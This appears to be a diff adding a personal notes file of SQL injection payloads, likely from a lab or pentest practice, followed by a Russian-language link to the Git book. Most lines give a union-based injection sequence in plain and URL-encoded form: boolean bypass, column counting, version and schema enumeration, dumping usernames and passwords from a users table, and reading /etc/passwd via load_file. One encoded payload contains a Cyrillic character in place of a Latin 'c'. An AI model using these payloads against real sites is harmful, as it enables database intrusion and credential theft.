@@ -1,0 +1,28 @@
+2%20or%201%20--%20-
+2 or 1 -- -
+
+1%20order%20by%204%20--%20-
+1 order by 4 -- -
+
+2%20union%20select%20null%2сnull%2сversion()%20--%20-
+
+union select null,null,table_name from information_schema.tables where table_schema=database() -- -
+6%20union%20select%20null%2cnull%2ctable_name%20from%20information_schema.tables%20where%20table_schema%3ddatabase()%20--%20-
+
+union select null,null,table_name from information_schema.tables where table_schema=database()
+6%20union%20select%20null%2cnull%2ctable_name%20from%20information_schema.tables%20where%20table_schema=database()%20--%20-
+
+union select null,null,table_name from information_schema.tables where table_schema=database() limit 1,1 -- -
+6%20union%20select%20null%2cnull%2ctable_name%20from%20information_schema.tables%20where%20table_schema=database()%20limit%201%2c1%20--%20-
+
+union select null,null,column_name from information_schema.columns where table_name='users' limit 1,1 -- -
+6%20union%20select%20null%2cnull%2ccolumn_name%20from%20information_schema.columns%20where%20table_name%3d'users'%20limit%201%2c1%20--%20-
+
+union select null,username,pass from PT.users -- -
+6%20union%20select%20null%2cusername%2cpass%20from%20PT.users%20--%20-
+
+union select null,null, load_file('/etc/passwd') -- -
+6%20union%20select%20null%2cnull%2c%20load_file('/etc/passwd')%20--%20-
+
+книга по git:
+https://git-scm.com/book/ru/v2/
